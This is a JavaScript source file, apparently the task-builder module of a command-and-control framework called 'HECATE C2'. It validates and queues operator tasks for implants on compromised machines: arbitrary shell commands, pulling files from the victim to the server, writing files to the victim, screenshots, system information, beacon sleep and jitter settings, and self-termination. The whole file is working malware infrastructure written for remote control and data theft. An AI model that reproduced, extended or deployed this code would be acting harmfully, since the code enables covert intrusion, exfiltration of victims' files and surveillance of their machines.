'use strict';

/**
 * HECATE C2 — Task Builder
 * Validates and constructs task payloads for each supported task type.
 * Operators call these via the API; the resulting task is enqueued.
 */

const { TASK_TYPES } = require('../implant/protocol');
const taskQueue      = require('../implant/task-queue');

/**
 * Shell command — execute in the implant's shell context.
 * @param {string} implantId
 * @param {string} cmd        - command string
 * @param {number} timeoutSec - max execution time (default 30)
 */
function shell(implantId, cmd, timeoutSec = 30) {
  if (!cmd?.trim()) throw new Error('cmd required for shell task');
  return taskQueue.enqueue(implantId, TASK_TYPES.SHELL, {
    cmd: cmd.trim(),
    timeout: timeoutSec,
  });
}

/**
 * Collect system information snapshot.
 */
function sysinfo(implantId) {
  return taskQueue.enqueue(implantId, TASK_TYPES.SYSINFO, {});
}

/**
 * Upload — read a file from the implant and send to server.
 * @param {string} implantId
 * @param {string} remotePath  - path on implant filesystem
 */
function upload(implantId, remotePath) {
  if (!remotePath) throw new Error('remotePath required for upload task');
  return taskQueue.enqueue(implantId, TASK_TYPES.UPLOAD, { path: remotePath });
}

/**
 * Download — write a file to the implant filesystem.
 * @param {string} implantId
 * @param {string} remotePath  - destination path on implant
 * @param {string} content     - base64-encoded file content
 */
function download(implantId, remotePath, content) {
  if (!remotePath) throw new Error('remotePath required for download task');
  if (!content)    throw new Error('content (base64) required for download task');
  return taskQueue.enqueue(implantId, TASK_TYPES.DOWNLOAD, {
    path:    remotePath,
    content,                          // base64 file contents
    bytes:   Buffer.from(content, 'base64').length,
  });
}

/**
 * Sleep — change beacon interval.
 * @param {string} implantId
 * @param {number} sleepSec
 * @param {number} jitterPct
 */
function sleep(implantId, sleepSec, jitterPct = 20) {
  if (sleepSec < 1) throw new Error('sleepSec must be >= 1');
  return taskQueue.enqueue(implantId, TASK_TYPES.SLEEP,
    { sleep: sleepSec, jitter: jitterPct }, true);
}

/**
 * Screenshot — request a screen capture.
 */
function screenshot(implantId) {
  return taskQueue.enqueue(implantId, TASK_TYPES.SCREENSHOT, {});
}

/**
 * Die — terminate the implant.
 * @param {string} reason
 */
function die(implantId, reason = 'operator') {
  return taskQueue.enqueue(implantId, TASK_TYPES.DIE, { reason }, true);
}

// ── Result parsers ─────────────────────────────────────────────────────────────

/**
 * Parse a task result from implant — normalise across task types.
 */
function parseResult(task, rawResult) {
  const base = {
    taskId:    task.id,
    type:      task.type,
    implantId: task.implantId,
    output:    rawResult.output   ?? '',
    exitCode:  rawResult.exitCode ?? 0,
    error:     rawResult.error    ?? null,
    receivedAt: new Date().toISOString(),
  };

  // Type-specific enrichment
  if (task.type === TASK_TYPES.SYSINFO) {
    try {
      base.structured = JSON.parse(rawResult.output);
    } catch { base.structured = null; }
  }

  if (task.type === TASK_TYPES.UPLOAD) {
    // output is base64 file content
    base.bytes    = rawResult.output ? Buffer.from(rawResult.output, 'base64').length : 0;
    base.isBase64 = true;
  }

  return base;
}

module.exports = { shell, sysinfo, upload, download, sleep, screenshot, die, parseResult };
